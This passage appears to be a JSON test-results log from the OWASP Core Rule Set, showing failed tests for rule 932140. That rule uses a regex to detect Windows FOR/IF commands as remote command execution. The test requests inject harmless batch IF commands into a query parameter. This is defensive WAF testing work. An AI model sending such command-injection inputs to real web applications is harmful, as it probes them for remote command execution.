          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 111,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 111,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%25n1%25%22+lss+%22%25n2%25%22+echo+%22%25n1%25%22+is+less+than+%22%25n2%25%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 112,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 112,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+%22%25n1%25%22+equ+%22%25n2%25%22+echo+%22%25n1%25%22+is+equal+to+%22%25n2%25%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 113,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 113,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=if+not+defined+n1+set+%22n1%3D0%22",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 114,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 114,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=IF+X%251%3D%3DX%2F%3F+GOTO+Helpscreen",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
